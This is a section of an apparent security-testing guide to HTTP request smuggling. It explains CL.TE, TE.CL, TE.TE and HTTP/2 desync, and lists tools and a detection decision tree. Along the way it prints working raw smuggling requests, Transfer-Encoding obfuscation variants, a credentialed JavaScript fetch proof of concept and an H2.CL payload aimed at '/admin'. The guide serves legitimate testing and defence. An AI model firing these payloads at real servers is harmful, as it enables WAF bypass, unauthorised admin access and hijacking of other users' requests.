# http-smuggling-test · part 2

> 分段 2/4。完整索引见 `http-smuggling-test.md`。

## 1. CORE CONCEPT

**Definition**: two (or more) HTTP processing entities disagree on where request one ends and request two begins in the **same TCP/TLS stream**, allowing an attacker to include a **partial or full** second request inside one logical request.

```
  Client          Front (proxy/WAF)              Back (origin)
     |                     |                            |
     |==== Request A+B ===>|                            |
     |                     | parses boundary #1         | parses boundary #2
     |                     |         \                  |         /
     |                     |          different split points
     |                     |                            |
     v                     v                            v
                   Request A (seen)              Request A' + smuggled B
```

**Difference from CRLF injection**: CRLF usually injects into **responses** or **header lines**; smuggling targets implementation differences in **RFC 7230 message framing** (`Content-Length` / `chunked`).

**High-value impact**: WAF rule bypass (smuggled body not visible in front-end request), hijacking other users' requests on shared-origin connections (queue poisoning), cache-poisoning assistance, and authentication-boundary confusion.

---
## 2. CL.TE VULNERABILITIES

**Pattern**: front end trusts **`Content-Length`**; back end trusts **`Transfer-Encoding: chunked`**.

**Exact example** (same as §0): `Content-Length: 13` and `Transfer-Encoding: chunked` both exist, body is:

```text
0\r\n\r\nSMUGGLED
```

Byte count: `0` + `\r\n` + `\r\n` + `SMUGGLED` = 13.

**Back-end perspective**: the chunked stream ends at `0\r\n\r\n`; if `SMUGGLED` starts with `METHOD SP` or another valid request prefix, it becomes a **smuggled request-line prefix**.

**Tuning**: if the target is sensitive to duplicate headers, casing, or spaces, minimally adjust `Transfer-Encoding` variants (see §4) while preserving semantics to match a combo where front end ignores TE and back end executes TE.

---
## 3. TE.CL VULNERABILITIES

**Pattern**: front end parses **chunked**; back end only reads **`Content-Length`** (or too-short CL).

**Intent**: front end treats the whole malicious byte stream as body; back end reads only CL length, leaving remaining bytes buffered to splice with later legitimate requests.

**Full TE.CL with embedded second request** (same family as §0; `Content-Length: 4` + first chunk-length line `35\r\n`):

```http
POST / HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

35
GET /admin HTTP/1.1
Host: target.example
Foo: x

0


```

Explanation:

- **Back end (CL)**: reads only 4 bytes from the message body start -> `3` `5` `\r` `\n`, marks body complete, and leaves the remaining bytes in the TCP read buffer.
- **Front end (TE)**: parses full stream as chunked and forwards/consumes `GET /admin...` as body content of the **already-closed first request** (product-dependent); mismatch with back-end boundary interpretation forms TE.CL.

For longer smuggling (e.g., `POST` + `Content-Length: 11` + `x=1`), chunk length is about `76` (hex `0x76` = 118 bytes); `Content-Length: 4` can still pin the back end to reading only the length line.

**Practical notes**: chunk length must be valid hex; second request must meet target expectations for Host, path, and session cookie; timing window and connection-reuse strategy determine whether you hit another user's request.

---
## 4. TE.TE VULNERABILITIES

**Pattern**: both front and back claim to process `Transfer-Encoding`, but differ on which TE value is effective or valid -> still producing equivalent desync where one side sees chunked and the other does not.

Use the following **8 obfuscation variants** to probe parser differentials (single-line display; `\t` means a real TAB):

```http
Transfer-Encoding: xchunked
```

```http
Transfer-Encoding : chunked
```

```http
Transfer-Encoding: chunked
Transfer-Encoding: chunked
```

```http
Transfer-Encoding: x
```

```http
Transfer-Encoding:[TAB]chunked
```
(Replace `[TAB]` with real `\x09`.)

```http
 Transfer-Encoding: chunked
```
(One leading space at line start.)

```http
X: X
Transfer-Encoding: chunked
```
(Previous line value is `X` and next line starts with `Transfer-Encoding`: this uses **line continuation / lenient header parsing** so one hop may merge or split lines incorrectly; separator between `X` and `Transfer-Encoding` may be `\n` or `\r\n` depending on the target stack.)

```http
Transfer-Encoding
: chunked
```
(Field name and colon are on **different physical lines**; some parsers still treat it as valid `Transfer-Encoding: chunked`.)

**Strategy**: for each (front, back) pair, enumerate which side accepts each variant as `chunked`, then map to equivalent CL.TE or TE.CL using §2/§3.

---
## 5. HTTP/2 REQUEST SMUGGLING

### H2 -> H1 Downgrade

Common scenario: edge supports HTTP/2 and origin uses HTTP/1.1. If implementation does not strictly normalize header fields and body boundaries, you may observe:

- incorrect pseudo-header to regular-header mapping order;
- forbidden headers (such as some `Connection` combinations) forwarded incorrectly;
- duplicate-header merge rules inconsistent with the origin.

### Pseudo-header / header-injection smuggling (concept payload)

Attack surface comes from downstream H1 parsers treating certain bytes as the **start of a new request**. A common research approach is to place near-request bytes inside header values that one layer ignores but another treats literally:

```text
header ignored\r\n\r\nGET / HTTP/1.1\r\nHost: target
```

**Meaning**: if one hop keeps the full string in a header value and the next hop mis-splits during H1 reconstruction, parsing may start a new `GET / HTTP/1.1` at `\r\n\r\n`.

**Testing directions**:

- duplicate and case handling for `Transfer-Encoding` / `Content-Length` in H2 (H2 requires lowercase, but translation layers can fail);
- downgrade behavior when `:method` or `:path` includes abnormal characters;
- interactions between tunneling or extended CONNECT and smuggling.

---
## 6. CLIENT-SIDE DESYNC

**Scenario**: browser request-body handling differs from middleware/origin, or **`no-cors` + preflight exemptions** permit atypical messages that create queue effects similar to classic CL.TE/TE.CL (architecture-dependent).

**HEAD + GET chain**: some stacks historically mishandle HEAD response bodies, later pipelining, or connection reuse; validate with concrete browser versions and target proxy behavior.

**JavaScript PoC shape** (illustrative: set body to raw bytes containing `GET`, with `no-cors` and credentials):

```javascript
fetch("https://target.example/vulnerable", {
  method: "POST",
  mode: "no-cors",
  credentials: "include",
  body: "GET /admin HTTP/1.1\r\nHost: target.example\r\n\r\n"
});
```

**Note**: browser security model limits direct readability; success often appears as side effects on other requests over the same connection or as abnormal server logs/behavior, not direct response reading. Evaluate with SOP, CORS, and extension/proxy factors.

---
## 7. TOOLS

| Tool | Purpose |
|------|------|
| **Burp Suite — HTTP Request Smuggler** (BApp Store) | Automated desync detection, common variants, timing-delta checks |
| **defparam/smuggler** (GitHub) | Python scripts for batch generation/sending of smuggling probes |
| **dhmosfunk/simple-http-smuggler-generator** (GitHub) | Quickly assemble raw CL.TE / TE.CL message templates |

**Usage advice**: first passively confirm a **front-end + origin** two-hop path, then select minimally disruptive probes, and lower concurrency in production.

---
## 8. DETECTION DECISION TREE

```
                        Start: reverse proxy / CDN in path?
                                    |
                    NO -------------+------------- YES
                    |                               |
            Low classic smuggling                    |
            (still test H2 desync)                   v
                                            Can you send TE + CL together?
                                                    |
                              NO -------------------+------------------- YES
                              |                                         |
                      Test H2-only issues                    Front prefers which?
                      (pseudo-header, reset)                            |
                                        +-------------------------------+-------------------------------+
                                        |                               |                               |
                                   CL wins                          TE wins                         errors /
                                        |                               |                          connection
                                        v                               v                               |
                                   CL.TE probes                    TE.CL probes                    TE.TE obfuscation
                                   (Sec 0,2)                       (Sec 0,3)                       (Sec 4)
                                        |                               |                               |
                                        v                               v                               v
                              Time / content /                    Adjust chunk                     Pairwise matrix:
                              queue poisoning                     sizes + CL                      which hop accepts
                              signals?                            alignment                       which variant?
                                        |                               |                               |
                                        +-------------------------------+-------------------------------+
                                                                        |
                                                                        v
                                                              Confirm with second request
                                                              smuggled (replay-safe)
                                                              or Collaborator-style side signal
```

---

### Advanced Reference


---
## 附件：H2_SMUGGLING_VARIANTS

### HTTP/2 Smuggling Variants & Advanced Desync Techniques
## 1. H2.CL — HTTP/2 Content-Length Desync

### 1.1 Concept

The front-end speaks HTTP/2 with the client and downgrades to HTTP/1.1 toward the back-end. HTTP/2 frames have their own length field (frame length), but the proxy may also forward a `content-length` header to the back-end. If these disagree, the back-end trusts `content-length` while the front-end trusts the H2 frame boundary.

### 1.2 Attack Flow

```
Client ──[HTTP/2]──> Front-end proxy ──[HTTP/1.1]──> Back-end

1. Client sends H2 POST with:
   - H2 DATA frame containing: "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target\r\n\r\n"
   - content-length header: 0

2. Front-end (H2): reads entire DATA frame as body of first request
   → forwards to back-end as HTTP/1.1 POST

3. Back-end (H1): sees content-length: 0
   → treats body as empty
   → remaining bytes become: "GET /admin HTTP/1.1\r\nHost: target\r\n\r\n"
   → parsed as second request
```

### 1.3 Byte-Level Payload

```http
:method: POST
:path: /
:authority: target.example
content-type: application/x-www-form-urlencoded
content-length: 0

GET /admin HTTP/1.1
Host: target.example

```

The H2 DATA frame carries the entire body including the smuggled `GET /admin` request. The `content-length: 0` header tells the back-end the POST body is empty.

### 1.4 Confirming H2.CL

```
Step 1: Send H2 POST with content-length: 0 and smuggled prefix "G"
Step 2: Follow immediately with normal GET / on same connection
Step 3: If back-end sees "GGET / HTTP/1.1" → 405 or error → confirmed

Timing version:
- Smuggle "GET /sleep?delay=10 HTTP/1.1..." 
- Subsequent request on same connection delayed → confirmed
```

---
